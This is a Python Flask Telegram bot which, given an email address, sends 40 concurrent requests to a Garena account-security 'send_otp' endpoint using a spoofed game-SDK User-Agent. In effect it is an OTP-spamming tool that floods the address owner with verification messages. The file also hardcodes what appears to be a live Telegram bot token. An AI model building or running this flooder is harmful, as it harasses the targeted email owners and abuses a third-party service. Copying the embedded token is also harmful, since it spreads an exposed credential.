import requests
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request

app = Flask(__name__)

BOT_TOKEN = "8658580899:AAGklJayHDFNGVlSRmRr6oC8J6i_YwLRcKA"
GARENA_URL = "https://100067.connect.garena.com/game/account_security/swap:send_otp"

headers = {
    'User-Agent': "GarenaMSDK/4.0.41(SM-A065F ;Android 15;ar;MA;app 1.123.1 2019120270;)",
    'Connection': "Keep-Alive",
    'Accept': "application/json",
    'Accept-Encoding': "gzip"
}

def send_request(email, req_id):
    try:
        payload = {'app_id': "100067", 'email': email, 'locale': "ar_MA"}
        response = requests.post(GARENA_URL, data=payload, headers=headers, timeout=10)
        return f"[{req_id}] {response.status_code} - {response.text[:200]}"
    except Exception as e:
        return f"[{req_id}] خطأ: {str(e)}"

def send_40_requests(email):
    results = []
    with ThreadPoolExecutor(max_workers=40) as executor:
        futures = [executor.submit(send_request, email, i) for i in range(1, 41)]
        results = [f.result() for f in futures]
    return "\n".join(results)

def send_telegram(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    for i in range(0, len(text), 4000):
        requests.post(url, json={"chat_id": chat_id, "text": text[i:i+4000]})

@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
def webhook():
    update = request.get_json()
    if update and update.get("message"):
        chat_id = update["message"]["chat"]["id"]
        text = update["message"].get("text", "")
        
        if "@" in text:
            email = text.strip()
            send_telegram(chat_id, f"⏳ جاري إرسال 40 طلباً إلى {email}...")
            result = send_40_requests(email)
            send_telegram(chat_id, f"✅ النتائج:\n\n{result}")
        else:
            send_telegram(chat_id, "📧 أرسل البريد الإلكتروني فقط مثال: name@gmail.com")
    
    return "ok", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
